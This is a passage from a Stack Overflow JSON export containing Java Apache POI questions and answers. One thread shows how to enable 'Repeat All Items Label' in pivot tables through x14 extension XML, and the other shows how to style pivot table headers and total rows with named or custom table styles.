{&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001683&quot;,&quot;Description1&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,780936.58},\r\n       {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001695&quot;,&quot;Description2&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,136.28},\r\n       {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001692&quot;,&quot;Description3&quot;,&quot;03/05/2017&quot;,&quot;CAT1&quot;,191468.21},\r\n       {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001698&quot;,&quot;Description4&quot;,&quot;04/05/2017&quot;,&quot;CAT1&quot;,10.11}\r\n      };\r\n    \r\n      XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\r\n      XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\r\n      for(Object[] dataRow : data){\r\n       XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n       for(Object dataCell : dataRow){\r\n        XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\r\n        if (dataCell instanceof String) {\r\n         cell.setCellValue((String)dataCell);\r\n        } else if (dataCell instanceof Double) {\r\n         cell.setCellValue((Double)dataCell);\r\n        }\r\n       }\r\n      }\r\n    \r\n      AreaReference areaReference = new AreaReference(&quot;A1:H&quot;+ (sheet.getLastRowNum() + 1), SpreadsheetVersion.EXCEL2007);\r\n      XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), sheet);\r\n      pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\r\n    \r\n      List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n      iterList.add(0);\r\n      iterList.add(1);\r\n      iterList.add(2);\r\n      iterList.add(3);\r\n      iterList.add(4);\r\n      iterList.add(5);\r\n      iterList.add(6);\r\n    \r\n      //set updated pivot table version to 6\r\n      //necessary to make extended pivot table setting available\r\n      pivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \r\n    \r\n      for (Integer j : iterList) {\r\n    \r\n       //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\r\n       pivotTable.addRowLabel(j);\r\n    \r\n       //determine unique labels in column j\r\n       TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\r\n       for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\r\n        uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\r\n       }\r\n       System.out.println(uniqueItems);\r\n       \r\n       //build pivot table and cache\r\n       CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\r\n       int i = 0;\r\n       for (String item : uniqueItems) {\r\n        //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\r\n        ctPivotField.getItems().getItemArray(i).unsetT();\r\n        ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n        //build a cache definition which has shared elements for those items \r\n        //&lt;sharedItems&gt;&lt;s v=&quot;TOM&quot;/&gt;&lt;s v=&quot;HARRY&quot;/&gt;&lt;/sharedItems&gt;\r\n        pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(j)\r\n         .getSharedItems().addNewS().setV(item);\r\n        i++;\r\n       }\r\n    \r\n       //ctPivotField.setAutoShow(false);\r\n       ctPivotField.setDefaultSubtotal(false);\r\n       //ctPivotField.setSubtotalTop(false);\r\n       //ctPivotField.setSubtotalCaption(null);\r\n       //ctPivotField.setCompact(false);\r\n       ctPivotField.setOutline(false);\r\n    \r\n       //remove further items\r\n       if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\r\n       for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n        ctPivotField.getItems().removeItem(k);\r\n       }\r\n       ctPivotField.getItems().setCount(i);\r\n    \r\n       //set &lt;x14:pivotField fillDownLabels=&quot;1&quot;/&gt; for each CTPivotField\r\n       //this is the &quot;Repeat All Items Label&quot; setting\r\n       CTExtensionList extList = ctPivotField.addNewExtLst();\r\n       CTExtension ext = extList.addNewExt();\r\n       String extXML = \r\n          &quot;&lt;x14:pivotField&quot;\r\n        + &quot; xmlns:x14=\\&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\&quot;&quot;\r\n        + &quot; fillDownLabels=\\&quot;1\\&quot;/&gt;&quot;;\r\n       org.apache.xmlbeans.XmlObject xlmObject = org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\r\n       ext.set(xlmObject);\r\n       ext.setUri(&quot;{2946ED86-A175-432a-8AC1-64E0C546D7DE}&quot;);  \r\n       \r\n      }\r\n    \r\n      System.out.println(&quot;----end---&quot;);\r\n    \r\n      pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\r\n    \r\n      FileOutputStream fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\r\n      wb.write(fileOut);\r\n      fileOut.close();\r\n      wb.close();\r\n     }\r\n    }\r\n\r\nNote: I have removed the `XSSFTable` creation from your code since it is not necessary and is done wrong and leads to a corrupted `Excel` file if done as you have done it.\r\n","title":"How to Repeat All Labels in PIVOT Table- Apache POI","body":"<p>The &quot;Repeat All Items Label&quot; setting for pivot tables was implemented after the <code>Office Open XML</code> was published. That's why it is not part of it. It uses special extended <code>XML</code> from name space <code>x14</code>. But <code>apache poi</code> only provides <code>Office Open XML</code>.</p>\n<p>So if we want using extended <code>XML</code> from name space <code>x14</code>, we need doing that on low <code>XML</code> level.</p>\n<p>First we need setting updated pivot table version to 6 instead of 3.</p>\n<p>Then we need set <code>&lt;x14:pivotField fillDownLabels=&quot;1&quot;/&gt;</code> for each <code>CTPivotField</code>. This is the &quot;Repeat All Items Label&quot; setting.</p>\n<p>Complete example which extends your showed code:</p>\n<pre><code>import org.apache.poi.xssf.usermodel.*;\nimport org.apache.poi.ss.usermodel.*;\nimport org.apache.poi.ss.util.*;\nimport org.apache.poi.ss.*;\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.TreeSet;\nimport java.util.List;\nimport org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\n\npublic class TestPivotTable {\n public static void main(String[] args) throws Exception {\n  Workbook wb = new XSSFWorkbook();\n  Object[][] data = new Object[][]{\n   {&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \n   {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001683&quot;,&quot;Description1&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,780936.58},\n   {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001695&quot;,&quot;Description2&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,136.28},\n   {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001692&quot;,&quot;Description3&quot;,&quot;03/05/2017&quot;,&quot;CAT1&quot;,191468.21},\n   {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001698&quot;,&quot;Description4&quot;,&quot;04/05/2017&quot;,&quot;CAT1&quot;,10.11}\n  };\n\n  XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\n  XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\n  for(Object[] dataRow : data){\n   XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n   for(Object dataCell : dataRow){\n    XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\n    if (dataCell instanceof String) {\n     cell.setCellValue((String)dataCell);\n    } else if (dataCell instanceof Double) {\n     cell.setCellValue((Double)dataCell);\n    }\n   }\n  }\n\n  AreaReference areaReference = new AreaReference(&quot;A1:H&quot;+ (sheet.getLastRowNum() + 1), SpreadsheetVersion.EXCEL2007);\n  XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), sheet);\n  pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\n\n  List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\n  iterList.add(0);\n  iterList.add(1);\n  iterList.add(2);\n  iterList.add(3);\n  iterList.add(4);\n  iterList.add(5);\n  iterList.add(6);\n\n  //set updated pivot table version to 6\n  //necessary to make extended pivot table setting available\n  pivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \n\n  for (Integer j : iterList) {\n\n   //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\n   pivotTable.addRowLabel(j);\n\n   //determine unique labels in column j\n   TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\n   for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\n    uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\n   }\n   System.out.println(uniqueItems);\n   \n   //build pivot table and cache\n   CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\n   int i = 0;\n   for (String item : uniqueItems) {\n    //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\n    ctPivotField.getItems().getItemArray(i).unsetT();\n    ctPivotField.getItems().getItemArray(i).setX((long)i);\n    //build a cache definition which has shared elements for those items \n    //&lt;sharedItems&gt;&lt;s v=&quot;TOM&quot;/&gt;&lt;s v=&quot;HARRY&quot;/&gt;&lt;/sharedItems&gt;\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(j)\n     .getSharedItems().addNewS().setV(item);\n    i++;\n   }\n\n   //ctPivotField.setAutoShow(false);\n   ctPivotField.setDefaultSubtotal(false);\n   //ctPivotField.setSubtotalTop(false);\n   //ctPivotField.setSubtotalCaption(null);\n   //ctPivotField.setCompact(false);\n   ctPivotField.setOutline(false);\n\n   //remove further items\n   if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\n   for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n    ctPivotField.getItems().removeItem(k);\n   }\n   ctPivotField.getItems().setCount(i);\n\n   //set &lt;x14:pivotField fillDownLabels=&quot;1&quot;/&gt; for each CTPivotField\n   //this is the &quot;Repeat All Items Label&quot; setting\n   CTExtensionList extList = ctPivotField.addNewExtLst();\n   CTExtension ext = extList.addNewExt();\n   String extXML = \n      &quot;&lt;x14:pivotField&quot;\n    + &quot; xmlns:x14=\\&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\&quot;&quot;\n    + &quot; fillDownLabels=\\&quot;1\\&quot;/&gt;&quot;;\n   org.apache.xmlbeans.XmlObject xlmObject = org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\n   ext.set(xlmObject);\n   ext.setUri(&quot;{2946ED86-A175-432a-8AC1-64E0C546D7DE}&quot;);  \n   \n  }\n\n  System.out.println(&quot;----end---&quot;);\n\n  pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\n\n  FileOutputStream fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\n  wb.write(fileOut);\n  fileOut.close();\n  wb.close();\n }\n}\n</code></pre>\n<p>Note: I have removed the <code>XSSFTable</code> creation from your code since it is not necessary and is done wrong and leads to a corrupted <code>Excel</code> file if done as you have done it.</p>\n"}],"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":688,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":58903846,"answer_count":1,"score":0,"last_activity_date":1640268536,"creation_date":1573698307,"question_id":58848489,"body_markdown":"How to achieve the Repeat All items in Pivot table as per below screen shot and also need to know how we can get that drop down icon across all columns. now drop down icon showing only at the first column.\r\nIs Repeat All Items is achievable in Apache POI?.\r\n\r\nbelow is the code.\r\n\r\nOutput which i am getting:\r\n\r\n[![enter image description here][1]][1]\r\n\r\noutput which i need:\r\n\r\n[![enter image description here][2]][2]\r\n\r\n     public class TestPivotTable\r\n     {\r\n    public static void main(String[] args) throws Exception\r\n    {\r\n        Workbook wb = new XSSFWorkbook();\r\n        String[][] data = new String[][]{{&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \r\n     {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001683&quot;,&quot;Description1&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,&quot;7,80,936.58&quot;},\r\n            {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001695&quot;,&quot;Description2&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,&quot;136.28&quot;},\r\n            {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001692&quot;,&quot;Description3&quot;,&quot;03/05/2017&quot;,&quot;CAT1&quot;,&quot;191468.21&quot;},\r\n            {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001698&quot;,&quot;Description4&quot;,&quot;04/05/2017&quot;,&quot;CAT1&quot;,&quot;10.11&quot;}};\r\n\r\n        XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\r\n        XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\r\n        for(String[] dataRow : data){\r\n            XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n            for(String dataCell : dataRow){\r\n                XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\r\n                cell.setCellValue(dataCell);\r\n            }\r\n        }\r\n        XSSFTable table = sheet.createTable();    \r\n        CTTable cttable = table.getCTTable();\r\n        table.setDisplayName(&quot;table&quot;);\r\n        cttable.setRef(&quot;A1:D4&quot;);\r\n        cttable.setId(1);\r\n\r\n        CTTableColumns columns = cttable.addNewTableColumns();\r\n        columns.setCount(3);\r\n\r\n        int g = 1;\r\n        for (String colName : data[0]){\r\n            CTTableColumn column = columns.addNewTableColumn();\r\n            column.setId(++g);\r\n            column.setName(colName);      \r\n        }\r\n      AreaReference areaReference = new AreaReference(&quot;A1:H&quot;+ (sheet.getLastRowNum() + \r\n      1),SpreadsheetVersion.EXCEL2007);\r\n      FileOutputStream fileOut=null;\r\n      try {\r\n        XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), \r\n      sheet);\r\n\r\n        pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\r\n\r\n        List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n\r\n        iterList.add(0);\r\n        iterList.add(1);\r\n        iterList.add(2);\r\n        iterList.add(3);\r\n        iterList.add(4);\r\n        iterList.add(5);\r\n        iterList.add(6);\r\n\r\n        for (Integer j : iterList) {\r\n\r\n            pivotTable.addRowLabel(j);\r\n            TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;();\r\n            for (int r = areaReference.getFirstCell().getRow()+1; r &lt; \r\n       areaReference.getLastCell().getRow()+1; r++) {\r\n                uniqueItems.add(sheet.getRow(r).getCell(j).toString());\r\n            }\r\n            System.out.println(uniqueItems);\r\n            CTPivotField ctPivotField = \r\n       pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\r\n            int i = 0;\r\n            for (String item : uniqueItems) {\r\n                ctPivotField.getItems().getItemArray(i).unsetT();\r\n                ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n\r\n\r\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().\r\n     getCacheFieldArray(j)\r\n                .getSharedItems().addNewS().setV(item);\r\n                i++;\r\n            }\r\n           // ctPivotField.setAutoShow(false);\r\n            ctPivotField.setDefaultSubtotal(false);\r\n             ctPivotField.setOutline(false);\r\n           // ctPivotField.setCompact(false);\r\n           // ctPivotField.setSubtotalTop(true);\r\n            if (ctPivotField.getDefaultSubtotal()) i++; \r\n            for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n                ctPivotField.getItems().removeItem(k);\r\n            }\r\n            ctPivotField.getItems().setCount(i);\r\n\r\n        }\r\n\r\n        System.out.println(&quot;----end---&quot;);\r\n\r\n        pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\r\n\r\n        fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\r\n        wb.write(fileOut);\r\n    }catch(Exception e) {\r\n        System.out.println(&quot;Exception While Creating Pivot Table&quot;+e);\r\n    }finally {\r\n        fileOut.close();\r\n        wb.close();\r\n    }\r\n\r\n    }\r\n   }\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/r7hKc.png\r\n  [2]: https://i.stack.imgur.com/wFkjc.png","title":"How to Repeat All Labels in PIVOT Table- Apache POI","body":"<p>How to achieve the Repeat All items in Pivot table as per below screen shot and also need to know how we can get that drop down icon across all columns. now drop down icon showing only at the first column.\nIs Repeat All Items is achievable in Apache POI?.</p>\n\n<p>below is the code.</p>\n\n<p>Output which i am getting:</p>\n\n<p><a href=\"https://i.stack.imgur.com/r7hKc.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/r7hKc.png\" alt=\"enter image description here\"></a></p>\n\n<p>output which i need:</p>\n\n<p><a href=\"https://i.stack.imgur.com/wFkjc.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/wFkjc.png\" alt=\"enter image description here\"></a></p>\n\n<pre><code> public class TestPivotTable\n {\npublic static void main(String[] args) throws Exception\n{\n    Workbook wb = new XSSFWorkbook();\n    String[][] data = new String[][]{{\"AAA\",\"BBB\",\"CCC\",\"DDD\",\"EEE\",\"FFF\",\"GGG\",\"HHH\"}, \n {\"TOM\",\"DUMMY\",\"VAL\",\"1001683\",\"Description1\",\"27/04/2017\",\"CAT\",\"7,80,936.58\"},\n        {\"TOM\",\"DUMMY\",\"VAL\",\"1001695\",\"Description2\",\"27/04/2017\",\"CAT\",\"136.28\"},\n        {\"HARRY\",\"DUMMY1\",\"VAL1\",\"1001692\",\"Description3\",\"03/05/2017\",\"CAT1\",\"191468.21\"},\n        {\"HARRY\",\"DUMMY1\",\"VAL1\",\"1001698\",\"Description4\",\"04/05/2017\",\"CAT1\",\"10.11\"}};\n\n    XSSFSheet sheet = (XSSFSheet) wb.createSheet(\"data\");\n    XSSFSheet pivot = (XSSFSheet) wb.createSheet(\"summary\");\n    for(String[] dataRow : data){\n        XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n        for(String dataCell : dataRow){\n            XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\n            cell.setCellValue(dataCell);\n        }\n    }\n    XSSFTable table = sheet.createTable();    \n    CTTable cttable = table.getCTTable();\n    table.setDisplayName(\"table\");\n    cttable.setRef(\"A1:D4\");\n    cttable.setId(1);\n\n    CTTableColumns columns = cttable.addNewTableColumns();\n    columns.setCount(3);\n\n    int g = 1;\n    for (String colName : data[0]){\n        CTTableColumn column = columns.addNewTableColumn();\n        column.setId(++g);\n        column.setName(colName);      \n    }\n  AreaReference areaReference = new AreaReference(\"A1:H\"+ (sheet.getLastRowNum() + \n  1),SpreadsheetVersion.EXCEL2007);\n  FileOutputStream fileOut=null;\n  try {\n    XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(\"A1\"), \n  sheet);\n\n    pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(\"AAA\");\n\n    List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\n\n    iterList.add(0);\n    iterList.add(1);\n    iterList.add(2);\n    iterList.add(3);\n    iterList.add(4);\n    iterList.add(5);\n    iterList.add(6);\n\n    for (Integer j : iterList) {\n\n        pivotTable.addRowLabel(j);\n        TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;();\n        for (int r = areaReference.getFirstCell().getRow()+1; r &lt; \n   areaReference.getLastCell().getRow()+1; r++) {\n            uniqueItems.add(sheet.getRow(r).getCell(j).toString());\n        }\n        System.out.println(uniqueItems);\n        CTPivotField ctPivotField = \n   pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\n        int i = 0;\n        for (String item : uniqueItems) {\n            ctPivotField.getItems().getItemArray(i).unsetT();\n            ctPivotField.getItems().getItemArray(i).setX((long)i);\n\n\npivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().\n getCacheFieldArray(j)\n            .getSharedItems().addNewS().setV(item);\n            i++;\n        }\n       // ctPivotField.setAutoShow(false);\n        ctPivotField.setDefaultSubtotal(false);\n         ctPivotField.setOutline(false);\n       // ctPivotField.setCompact(false);\n       // ctPivotField.setSubtotalTop(true);\n        if (ctPivotField.getDefaultSubtotal()) i++; \n        for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n            ctPivotField.getItems().removeItem(k);\n        }\n        ctPivotField.getItems().setCount(i);\n\n    }\n\n    System.out.println(\"----end---\");\n\n    pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, \"SUM\");\n\n    fileOut = new FileOutputStream(\"newoutputfile.xlsx\");\n    wb.write(fileOut);\n}catch(Exception e) {\n    System.out.println(\"Exception While Creating Pivot Table\"+e);\n}finally {\n    fileOut.close();\n    wb.close();\n}\n\n}\n</code></pre>\n\n<p>}</p>\n"},{"tags":["java","apache-poi","pivot","pivot-table"],"comments":[{"owner":{"account_id":9571720,"reputation":6305,"user_id":7109162,"accept_rate":84,"display_name":"XtremeBaumer"},"score":1,"creation_date":1574857775,"post_id":59070187,"comment_id":104378484,"body_markdown":"Have you tried to use `CellStyle`s? https://stackoverflow.com/questions/38874115/java-apache-poi-how-to-set-background-color-and-borders-at-same-time","body":"Have you tried to use <code>CellStyle</code>s? <a href=\"https://stackoverflow.com/questions/38874115/java-apache-poi-how-to-set-background-color-and-borders-at-same-time\" title=\"java apache poi how to set background color and borders at same time\">stackoverflow.com/questions/38874115/&hellip;</a>"},{"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"score":0,"creation_date":1574858514,"post_id":59070187,"comment_id":104378924,"body_markdown":"See https://stackoverflow.com/questions/56609207/how-to-change-the-pivot-table-style-from-default-blue-to-other-colors-using-apac/56609527#56609527. Best match of your wants might be \n`pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleDark7&quot;);`","body":"See <a href=\"https://stackoverflow.com/questions/56609207/how-to-change-the-pivot-table-style-from-default-blue-to-other-colors-using-apac/56609527#56609527\" title=\"how to change the pivot table style from default blue to other colors using apac\">stackoverflow.com/questions/56609207/&hellip;</a>. Best match of your wants might be  <code>pivotTable.getCTPivotTableDefinition().getPivotTableStyleInf&zwnj;&#8203;o().setName(&quot;PivotSt&zwnj;&#8203;yleDark7&quot;);</code>"},{"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"score":0,"creation_date":1574858780,"post_id":59070187,"comment_id":104379061,"body_markdown":"Hi Axel, i tried above but it not matching the requirement. i need to have only header and Grand Total should be Dark Green. is there any ways to achieve it.","body":"Hi Axel, i tried above but it not matching the requirement. i need to have only header and Grand Total should be Dark Green. is there any ways to achieve it."},{"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"score":0,"creation_date":1574859959,"post_id":59070187,"comment_id":104379703,"body_markdown":"As said in my linked answer, names of possible named styles can be got from Excels GUI in `PivotTable Tools` tab - `Design`. Other default pivot table styles are not present. They would must be created then.","body":"As said in my linked answer, names of possible named styles can be got from Excels GUI in <code>PivotTable Tools</code> tab - <code>Design</code>. Other default pivot table styles are not present. They would must be created then."},{"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"score":0,"creation_date":1574907833,"post_id":59070187,"comment_id":104398556,"body_markdown":"Thank You Axel, Currently i am using pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleLight21&quot;); which is light green . As of now i am ok with this color combination.","body":"Thank You Axel, Currently i am using pivotTable.getCTPivotTableDefinition().getPivotTableStyleInf&zwnj;&#8203;o().setName(&quot;PivotSt&zwnj;&#8203;yleLight21&quot;); which is light green . As of now i am ok with this color combination."}],"answers":[{"tags":[],"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1574908503,"creation_date":1574908503,"answer_id":59080987,"question_id":59070187,"body_markdown":"To achieve the required o/p we can use \r\n\r\npivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleLight21&quot;); which is light green. In this case only header and grand total row will have light green background. Currently its satisfies my requirement.\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/iCEvO.png","title":"How to Change the Default Header Background color in PIVOT Table","body":"<p>To achieve the required o/p we can use </p>\n\n<p>pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(\"PivotStyleLight21\"); which is light green. In this case only header and grand total row will have light green background. Currently its satisfies my requirement.</p>\n\n<p><a href=\"https://i.stack.imgur.com/iCEvO.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/iCEvO.png\" alt=\"enter image description here\"></a></p>\n"},{"tags":[],"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640268491,"creation_date":1574933950,"answer_id":59085731,"question_id":59070187,"body_markdown":"In `Excel` pivot tables are styled using special named pivot table styles. The names of possible named styles can be got from `Excel`&#39;s `GUI` in `PivotTable Tools` tab - `Design`. To set a style use:\r\n\r\n    pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleDark7&quot;);\r\n\r\nwhere `PivotStyleDark7` is the name of the named style.\r\n\r\nIf none of the default styles fulfill the requirements, then new named styles must be created. In `Excel`&#39;s `GUI` this is possible by creating a new pivot table style and format some of the given table style types, for example: header row, totals row, ...\r\n\r\nIf that shall be done using `apache poi`, then in [StylesTable](https://poi.apache.org/apidocs/dev/org/apache/poi/xssf/model/StylesTable.html) a new table style must be created. There for each table style type a table style element must point to a predefined `dxf` having the format.\r\n\r\n    ...\r\n      // create a new custom pivot table style\r\n      // create dxf for each needed table style type\r\n      STTableStyleType.Enum headerRow = STTableStyleType.HEADER_ROW;\r\n      CTDxf headerRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)0, (byte)80, (byte)0});\r\n      STTableStyleType.Enum totalRow = STTableStyleType.TOTAL_ROW;\r\n      CTDxf totalRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)0, (byte)80, (byte)0});\r\n      STTableStyleType.Enum firstRowSubheading = STTableStyleType.FIRST_ROW_SUBHEADING;\r\n      CTDxf firstRowSubheadingDxf = createDxf(true, null, null);\r\n      STTableStyleType.Enum secondRowSubheading = STTableStyleType.SECOND_ROW_SUBHEADING;\r\n      CTDxf secondRowSubheadingDxf = createDxf(true, null, null);\r\n      // map table style types to dxf\r\n      Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles = new HashMap&lt;STTableStyleType.Enum, CTDxf&gt;();\r\n      typeStyles.put(headerRow, headerRowDxf);\r\n      typeStyles.put(totalRow, totalRowDxf);\r\n      typeStyles.put(firstRowSubheading, firstRowSubheadingDxf);\r\n      typeStyles.put(secondRowSubheading, secondRowSubheadingDxf);\r\n      // \r\n      createPivotTableStyle(((XSSFWorkbook)wb).getStylesSource(), &quot;CustomPivotStyle1&quot;, typeStyles);\r\n      pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;CustomPivotStyle1&quot;);\r\n    ...\r\n___________________________________\r\n\r\n    ...\r\n     static CTDxf createDxf(boolean fontBold, byte[] fontRGB, byte[] fillRGB) {\r\n      CTDxf dxf = CTDxf.Factory.newInstance();\r\n      CTFont font = dxf.addNewFont();\r\n      if (fontBold) font.addNewB();\r\n      if (fontRGB != null) font.addNewColor().setRgb(fontRGB);\r\n      if (fillRGB != null) {\r\n       CTFill fill = dxf.addNewFill();\r\n       fill.addNewPatternFill().addNewBgColor().setRgb(fillRGB);\r\n      }\r\n      return dxf;\r\n     }\r\n    \r\n     static void createPivotTableStyle(StylesTable stylesTable, String styleName, Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles) {\r\n    \r\n      // get or create table styles\r\n      CTTableStyles tableStyles = stylesTable.getCTStylesheet().getTableStyles();\r\n      if (tableStyles == null) tableStyles = stylesTable.getCTStylesheet().addNewTableStyles();\r\n    \r\n      // add table style named as styleName\r\n      CTTableStyle tableStyle = tableStyles.addNewTableStyle();\r\n      tableStyle.setName(styleName);\r\n    \r\n      // set TableStyleType styles: TableStyleType -&gt; dxf\r\n      for 